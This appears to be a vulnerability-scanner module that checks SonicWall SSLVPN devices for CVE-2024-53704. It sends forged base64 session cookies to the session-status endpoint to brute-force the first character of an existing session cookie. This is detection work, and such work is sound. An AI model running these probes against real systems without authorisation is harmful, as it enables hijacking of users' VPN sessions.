"""Agent Asteroid implementation for CVE-2024-53704"""

import base64
import datetime
import logging
import re
import string
import json

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "SonicWall SSLVPN Authentication Bypass"
VULNERABILITY_REFERENCE = "CVE-2024-53704"
VULNERABILITY_DESCRIPTION = """
An authentication bypass vulnerability in SonicWall SSLVPN allows remote attackers 
to hijack existing authenticated client SSLVPN sessions via insecure base64 decoding
of session cookies.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
DEFAULT_SSLVPN_PORT = 4433

# Pattern for identifying SonicWall SSLVPN responses
SONICWALL_PATTERN = r"SonicWALL\s*-?\s*NetExtender"
API_STATUS_ENDPOINT = "/__api__/v1/client/sessionstatus"


def _generate_test_cookie(first_char: str) -> str:
    """
    Generate a test cookie with a given first character.
    """
    # Create a 31-byte cookie with the first character and null padding
    raw_cookie = first_char.encode() + (b'\x00' * 30)

    # Calculate checksum (XOR of all bytes in the cookie)
    checksum = 0
    for b in raw_cookie:
        checksum ^= b

    # Append the checksum byte
    raw_cookie += bytes([checksum])

    # Base64-encode the 32-byte cookie
    return base64.b64encode(raw_cookie).decode()


@exploits_registry.register
class SonicWallSSLVPNAuthBypassExploit(webexploit.WebExploit):
    """
    CVE-2024-53704: SonicWall SSLVPN Authentication Bypass

    Brute-force the first character of an existing session cookie.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be a SonicWall SSLVPN instance.
        """
        try:
            response = self.session.get(
                f"{target.origin}",
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            # Server header check
            return re.search(SONICWALL_PATTERN, response.text, re.IGNORECASE) is not None

        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Brute-force the first character of the session cookie.
        """
        vulnerabilities: list[definitions.Vulnerability] = []

        # Characters to test (expanded beyond just alphabetic)
        test_chars = string.ascii_letters + string.digits + string.punctuation

        for char in test_chars:
            try:
                # Generate test cookie with current character
                test_cookie = _generate_test_cookie(char)

                # Send request to session status endpoint
                response = self.session.get(
                    f"{target.origin}{API_STATUS_ENDPOINT}",
                    params={"cookie": test_cookie},
                    verify=False,
                    timeout=DEFAULT_TIMEOUT.seconds,
                )

                # Parse the JSON response
                response_json = response.json()

                # If status is not "notfound", we've found a potential first character
                if (response_json.get("status") is not None and
                        response_json.get("status") != "notfound"):
                    logging.info("Potential first character found: %s", char)

                    # Create and add vulnerability
                    vuln = self._create_vulnerability(target)
                    vulnerabilities.append(vuln)

            except (requests_exceptions.RequestException, ValueError, json.JSONDecodeError) as e:
                logging.error("Error during first character test: %s", e)

        return vulnerabilities
